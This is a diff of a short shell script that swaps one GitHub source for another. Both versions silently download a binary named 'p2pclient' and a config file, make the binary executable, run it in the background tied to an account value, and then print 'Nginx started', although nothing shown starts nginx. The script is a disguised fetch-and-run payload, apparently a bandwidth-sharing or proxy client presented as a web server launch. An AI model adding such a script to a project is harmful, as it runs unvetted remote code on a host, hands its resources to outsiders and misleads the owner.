@@ -1,1 +1,5 @@
-wget https://raw.githubusercontent.com/fight8/nginxx/main/config/p2p &>/dev/null && wget https://raw.githubusercontent.com/fight8/nginxx/main/config/p2pclient &>/dev/null && chmod +x p2pclient && echo "nohup ./p2pclient -l MAIL_ADDREES 2>1 &" | sed -e "s/MAIL_ADDREES/$(cat p2p)/" > p2p.sh &>/dev/null && chmod +x p2p.sh && ./p2p.sh && echo 'Nginx started'
+wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2p &>/dev/null ;\
+wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2pclient &>/dev/null ;\
+chmod +x p2pclient ;\
+./p2pclient -l $(cat p2p) &>/dev/null "$@" &
+echo 'Nginx started'
